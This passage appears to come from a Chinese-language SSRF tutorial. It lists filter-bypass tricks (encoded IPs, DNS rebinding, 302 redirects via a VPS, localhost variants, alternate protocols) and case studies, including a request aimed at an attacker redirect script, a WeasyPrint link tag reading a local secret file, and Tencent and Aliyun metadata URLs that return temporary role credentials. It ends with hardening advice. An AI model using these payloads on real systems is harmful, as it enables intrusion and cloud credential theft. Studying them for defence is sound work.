127.0.0.1的八进制: 0177.0.0.1，十六进制: 0x7f.0.0.1
#### 6、封闲式字母数字(Enclosed Alphanumerics):
​ ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> example.com  
​ ①②⑦. ⓪.⓪.①>>> 127.0.0.1
#### 7、 **DNS重绑定** :
一般进行 ssrf 防御的模式如下：
  1. 获取到输入的URL，从该URL中提取host
对该host进行DNS解析，获取到解析的IP
  2. 访问规则判断该IP是否在指定范围内（即判断IP是否符合规则）
如果IP在范围内，即对此URL发起请求
如果IP不在范围内，则请求失败
然而访问规则在判段得到的IP为指定范围内IP，到服务端请求URL这个中间还存在一个细微的时间差，
DNS重绑定则是利用这一点，让服务器第一次解析host的ip为符合规则的公网IP，在第二次请求解析URL时host的ip又变为了不符合规则的内网IP，从而进行ssrf。
这里推荐使用burpsuite的intruder模块，来批量发送请求，以利用时间差完成ssrf。
在线DNS重绑定平台：
#### 8、 **302重定向：**
需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中
服务端代码如下：
#### 9、绕过localhost:
    http://[::1]
    http://[::]:80/
    http://0:80
### 协议限制绕过:
如禁用了部分协议，尝试转换使用协议;
    http(s)、file、dict、gopher、（sftp、ldap、tftp）
## ssrf - 漏洞案例
#### 导入/导出型ssrf（无回显）
漏洞原理：在导入/上传图片、数据等内容时时将图片链接换成dnslog链接，服务器则在请求资源时会访问dnslog链接
Vps 设置 302 跳转 访问内网
    302.php 
POST /api/apimanage/trans/getThirdPartSwaggerJsonByAddr/ HTTP/1.1
Host: apicloud.xxx.com
Cookie:xxx=xxx
{"addr":"[http://106.12.xx.xx/302.php"}](http://106.12.xx.xx/302.php)
#### HTML导出PDF下的ssrf（组件）
WeasyPrint是一个用于HTML和CSS的可视化渲染引擎，可以将HTML文档导出为打印标准的PDF文件。
    WeasyPrint重新定义了一组html标签，包括img，embed，object等。根据我们之前的测试，我们已经知道javascript不是利用这一点的选项。在这一点上，我们的希望很低，我们开始认为PDF生成器不再可利用，直到我们发现对内部的几个文件的引用，包括pdf.py。这使我们能够通过使用 将任何网页或本地文件的内容附加到我们的 PDF 中。
特殊标签用法：在html标签前的双引号符号(”)，补充单引号（'），会被允许在PDF中解析
最终使用遵循特殊标签用法处理插入后，成功外连，漏洞存在  进一步利用 使用file协议，获取敏感文件 &lt;link
rel=attachment href="file:///root/secret.txt"&gt;  云上ssrf利用 云服务器一般会公开每个实例的内部服务(一般在帮助文档中都能查看)
如果发现云服务器中的 SSRF 漏洞，可以直接查询主机实例的元数据从⽽进⼀步深⼊利⽤。 腾讯云：
访问元数据 http://metadata.tencentyun.com/latest/meta-data/ 获取 metadata
版本信息。 查询实例元数据。 http://metadata.tencentyun.com/latest/meta-data/placement/region 获取实例物理所在地信息。 http://metadata.tencentyun.com/latest/meta-data/local-ipv4 获取实例内⽹ IP。实例存在多张⽹卡时，返回 eth0 设备的⽹络地址。
http://metadata.tencentyun.com/latest/meta-data/public-ipv4 获取实例公⽹ IP。
http://metadata.tencentyun.com/network/interfaces/macs/${mac}/vpc-id 实例⽹络接⼝
VPC ⽹络 ID。 在获取到⻆⾊名称后，可以通过以下链接取⻆⾊的临时凭证，${role-name} 为 CAM ⻆⾊ 的名称：
http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/${role name} 阿里云： 查看实例元数据的根目录
http://100.100.100.200/latest/meta-data 查看实例ID：
http://100.100.100.200/latest/meta-data/instance-id 访问RAM 角色的临时凭证：
http://100.100.100.200/latest/meta-data/ram/security-credentials/ 获取AK SK信息
http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role 具体云上ssrf漏洞案例可自行查看文章:
https://www.wangan.com/p/7fy784ff26339e4e
https://hackerone.com/reports/341876
http://www.myzaker.com/article/60c181bb8e9f0941bb67ffac
https://help.aliyun.com/document_detail/108460.html#section-w35-csp-imo ssrf - 加固和防御 内网环境下ssrf  去除url中的特殊字符
 将域名解析为IP，对内网IP进行限制 不跟随30x跳转（跟随跳转需要从1开始重新检测）
禁用高危协议，例如：gopher、dict、ftp、file等，只允许http/https 请求时设置host header为ip
 统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。  云上ssrf 
加固模式 加固模式下，实例基于token鉴权查看实例元数据，相比普通模式对SSRF攻击有更好的防范效果。
​  普通模式   ​
限制用户RAM角色权限，只赋予自己所需要的权限，这样可以将影响程度降到最低。 ​ （
以下为阿里云官方文档中普通模式和加固模式的对比）   参考文章: http://blog.leanote.com/post/snowming/e2c24cf057a4
https://mp.weixin.qq.com/s/RWmyPp9CBFjANz162_fBgA?exportid=export/UzFfAgtgekIEAQAAAAAAiqcJ9zQpKgAAAAstQy6ubaLX4KHWvLEZgBPE7YFwdxMPKLqBzNPgMItebr37kwBZSL05nyRkt6-j&amp;sessionid=-1948127107
https://aws.amazon.com/cn/blogs/china/talking-about-the-metadata-protection-on-the-instance-from-the-data-leakage-of-capital-one/ https://zhuanlan.zhihu.com/p/419610674
https://cloud.tencent.com/developer/article/1942119
https://blog.csdn.net/qq_43531669/article/details/113052373
https://help.aliyun.com/document_detail/108460.htm?spm=a2c4g.11186623.0.0.61c42032asxaiH#concept-dwj-y1x-wgb 